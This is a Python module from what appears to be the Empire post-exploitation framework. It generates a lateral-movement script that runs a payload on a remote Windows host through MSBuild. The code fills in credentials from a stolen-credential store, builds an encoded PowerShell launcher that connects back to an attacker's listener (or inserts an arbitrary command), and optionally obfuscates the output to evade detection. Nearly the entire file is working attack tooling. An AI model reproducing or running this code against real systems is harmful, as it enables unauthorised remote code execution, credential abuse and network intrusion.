from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        command = params['Command']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code
        script_end = "Invoke-ExecuteMSBuild"
        cred_id = params["CredID"]
        if cred_id != "":

            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)

            if cred.domain != "":
                params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
            else:
                params["UserName"] = str(cred.username)
            if cred.password != "":
                params["Password"] = cred.password

        # Only "Command" or "Listener" but not both
        if (listener_name == "" and command  == ""):
            return handle_error_message("[!] Listener or Command required")
        if (listener_name and command):
            return handle_error_message("[!] Cannot use Listener and Command at the same time")

        if not main_menu.listeners.is_listener_valid(listener_name) and not command:
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)
        elif listener_name:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                           userAgent=user_agent, proxy=proxy,
                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])
            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                launcher = launcher.replace('$','`$')
                script = script.replace('LAUNCHER',launcher)
        else:
            Cmd = command.replace('"','`"').replace('$','`$')
            script = script.replace('LAUNCHER',Cmd)
            print(helpers.color("[*] Running command:  " + command))


        # add any arguments to the end execution of the script
        script_end += " -ComputerName " + params['ComputerName']

        if params['UserName'] != "":
            script_end += " -UserName \"" + params['UserName'] + "\" -Password \"" + params['Password'] + "\""

        if params['DriveLetter']:
            script_end += " -DriveLetter \"" + params['DriveLetter'] + "\""

        if params['FilePath']:
            script_end += " -FilePath \"" + params['FilePath'] + "\""

        script_end += " | Out-String"

        # Get the random function name generated at install and patch the stager with the proper function name
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
